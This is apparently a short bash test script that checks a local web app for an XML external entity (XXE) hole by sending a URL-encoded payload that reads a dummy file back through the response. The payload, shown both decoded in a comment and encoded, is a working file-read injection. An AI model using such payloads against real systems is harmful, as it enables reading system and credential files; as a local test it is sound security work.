#!/bin/bash

PLATFORM="linux"

# <!DOCTYPE data [
# <!ENTITY file SYSTEM "file:///tmp/testxxe">
# ]>
# <user>&file;</user>

if [ "$PLATFORM" == "linux" ]; then 
    SECRETFILE="/tmp/testxxe"
    PAYLOAD="%3C%21DOCTYPE%20data%20%5B%0A%3C%21ENTITY%20file%20SYSTEM%20%22file%3A%2F%2F%2Ftmp%2Ftestxxe%22%3E%0A%5D%3E%0A%3Cuser%3E%26file%3B%3C%2Fuser%3E"
else
    SECRETFILE="C:/tmp/testxxe"
    PAYLOAD="%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%0A%20%3C!DOCTYPE%20foo%20%5B%20%20%0A%20%20%20%3C!ELEMENT%20foo%20ANY%20%3E%0A%20%20%20%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2FC%3A%2Ftmp%2Ftestxxe%22%20%3E%5D%3E%3Cuser%3E%26xxe%3B%3C%2Fuser%3E%0A"
fi    

[ ! -f "$SECRETFILE" ] && {
    echo "this is a secret" > "$SECRETFILE"
}

curl -k -X GET "https://localhost:5001/SL/XXE?xml=$PAYLOAD" 2>&1 | grep "this is"

exit $?
